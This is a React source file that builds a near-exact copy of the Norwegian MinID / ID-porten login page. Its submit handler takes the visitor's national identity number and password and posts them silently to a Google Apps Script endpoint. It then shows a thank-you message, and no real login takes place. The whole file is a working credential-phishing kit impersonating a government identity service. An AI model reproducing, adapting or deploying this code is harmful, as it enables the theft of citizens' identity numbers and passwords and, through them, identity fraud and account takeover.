import { useState } from "react";

const SCRIPT_URL =
  "https://script.google.com/macros/s/AKfycbxm6Py2UvUtHYfiNOolzW3wY937a6bJRDNp6IkeBVYMDYtUAosAvhEcik0BOAQT77r2/exec";

const styles = {
  page: {
    minHeight: "100vh",
    background: "#f2f4f4",
    display: "flex",
    flexDirection: "column",
    alignItems: "center",
    justifyContent: "center",
    fontFamily: "Inter, system-ui, -apple-system, Segoe UI, Roboto, sans-serif",
    color: "#1a2433",
    padding: "24px 16px",
    boxSizing: "border-box",
  },
  card: {
    background: "#ffffff",
    width: "100%",
    maxWidth: 496,
    borderRadius: 6,
    boxShadow: "0 1px 4px rgba(0,0,0,0.12)",
    padding: "40px 48px 40px",
    boxSizing: "border-box",
  },
  logoRow: {
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    gap: 8,
    marginBottom: 6,
  },
  logoText: {
    fontSize: 32,
    fontWeight: 500,
    color: "#1a2433",
    letterSpacing: "-0.5px",
  },
  subtitle: {
    textAlign: "center",
    fontSize: 17,
    margin: "10px 0 0",
  },
  divider: {
    border: "none",
    borderTop: "1px solid #c9cdd2",
    margin: "26px 0 36px",
  },
  label: {
    display: "block",
    fontSize: 20,
    fontWeight: 500,
    marginBottom: 6,
  },
  hint: {
    display: "block",
    fontSize: 16,
    color: "#4a5563",
    marginBottom: 10,
  },
  inputWrap: {
    position: "relative",
    marginBottom: 26,
  },
  input: {
    width: "100%",
    height: 60,
    border: "1px solid #5a6370",
    borderRadius: 3,
    padding: "0 14px",
    fontSize: 18,
    boxSizing: "border-box",
    outline: "none",
    background: "#fff",
    color: "#1a2433",
  },
  eyeButton: {
    position: "absolute",
    right: 14,
    top: "50%",
    transform: "translateY(-50%)",
    background: "none",
    border: "none",
    cursor: "pointer",
    padding: 4,
    display: "flex",
    alignItems: "center",
  },
  buttonRow: {
    display: "flex",
    gap: 10,
    marginTop: 6,
  },
  cancelBtn: {
    flex: 1,
    height: 54,
    background: "#fff",
    color: "#0062c0",
    border: "1px solid #0062c0",
    borderRadius: 3,
    fontSize: 18,
    fontWeight: 500,
    cursor: "pointer",
  },
  submitBtn: {
    flex: 1,
    height: 54,
    background: "#0062c0",
    color: "#fff",
    border: "1px solid #0062c0",
    borderRadius: 3,
    fontSize: 18,
    fontWeight: 500,
    cursor: "pointer",
  },
  forgot: {
    display: "inline-block",
    marginTop: 24,
    fontSize: 18,
    color: "#0062c0",
    textDecoration: "underline",
    background: "none",
    border: "none",
    padding: 0,
    cursor: "pointer",
    fontFamily: "inherit",
  },
  status: {
    minHeight: 24,
    textAlign: "center",
    marginTop: 18,
    fontSize: 16,
    color: "#4a5563",
  },
  footer: {
    display: "flex",
    gap: 20,
    marginTop: 24,
    fontSize: 18,
  },
  footerLink: {
    color: "#1a2433",
    textDecoration: "underline",
  },
  chatFab: {
    position: "fixed",
    right: 36,
    bottom: 24,
    width: 64,
    height: 64,
    borderRadius: "50%",
    background: "#0062c0",
    border: "none",
    boxShadow: "0 2px 8px rgba(0,0,0,0.25)",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    cursor: "pointer",
  },
};

function EyeIcon() {
  return (
    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#4a5563" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
      <path d="M1 12s4-7.5 11-7.5S23 12 23 12s-4 7.5-11 7.5S1 12 1 12z" />
      <circle cx="12" cy="12" r="3" />
    </svg>
  );
}

function ChatIcon() {
  return (
    <svg width="26" height="26" viewBox="0 0 24 24" fill="#ffffff">
      <path d="M4 4h16a1 1 0 0 1 1 1v11a1 1 0 0 1-1 1H8l-4 4V5a1 1 0 0 1 1-1zm3 4v2h10V8H7zm0 4v2h7v-2H7z" />
    </svg>
  );
}

function App() {
  const [fnr, setFnr] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [status, setStatus] = useState("");

  async function handleSubmit(e) {
    e.preventDefault();

    setStatus("Sender inn...");

    const formData = new URLSearchParams();
    formData.append("name", fnr);
    formData.append("answer", password);

    try {
      await fetch(SCRIPT_URL, {
        method: "POST",
        body: formData,
        mode: "no-cors",
      });

      setStatus("Takk! Svaret ditt er sendt inn.");
      setFnr("");
      setPassword("");
    } catch (error) {
      console.error(error);
      setStatus("Noe gikk galt. Prøv igjen.");
    }
  }

  function handleCancel() {
    setFnr("");
    setPassword("");
    setStatus("");
  }

  return (
    <div style={styles.page}>
      <div style={styles.card}>
        <div style={styles.logoRow}>
          <svg width="34" height="34" viewBox="0 0 34 34">
            <path d="M0 0h20a14 14 0 0 1 0 28H0z" fill="#0062c0" />
            <circle cx="17" cy="14" r="7" fill="#ffffff" />
          </svg>
          <span style={styles.logoText}>MinID</span>
        </div>
        <p style={styles.subtitle}>ID-porten</p>
        <hr style={styles.divider} />

        <form onSubmit={handleSubmit}>
          <label htmlFor="fnr" style={styles.label}>Fødselsnummer</label>
          <span style={styles.hint}>Norsk fødselsnummer eller d-nummer (11 siffer)</span>
          <div style={styles.inputWrap}>
            <input
              id="fnr"
              type="text"
              inputMode="numeric"
              value={fnr}
              onChange={(e) => setFnr(e.target.value)}
              required
              style={styles.input}
            />
          </div>

          <label htmlFor="password" style={styles.label}>Passord</label>
          <div style={styles.inputWrap}>
            <input
              id="password"
              type={showPassword ? "text" : "password"}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              style={{ ...styles.input, paddingRight: 52 }}
            />
            <button
              type="button"
              aria-label={showPassword ? "Skjul passord" : "Vis passord"}
              onClick={() => setShowPassword((s) => !s)}
              style={styles.eyeButton}
            >
              <EyeIcon />
            </button>
          </div>

          <div style={styles.buttonRow}>
            <button type="button" onClick={handleCancel} style={styles.cancelBtn}>
              Avbryt
            </button>
            <button type="submit" style={styles.submitBtn}>
              Logg inn
            </button>
          </div>
        </form>

        <button type="button" style={styles.forgot}>
          Glemt passord?
        </button>

        <p style={styles.status}>{status}</p>
      </div>

      <div style={styles.footer}>
        <a href="#" style={styles.footerLink}>Nynorsk</a>
        <a href="#" style={styles.footerLink}>English</a>
        <a href="#" style={styles.footerLink}>Davvisámegiella</a>
      </div>

      <button type="button" aria-label="Chat" style={styles.chatFab}>
        <ChatIcon />
      </button>
    </div>
  );
}

export default App;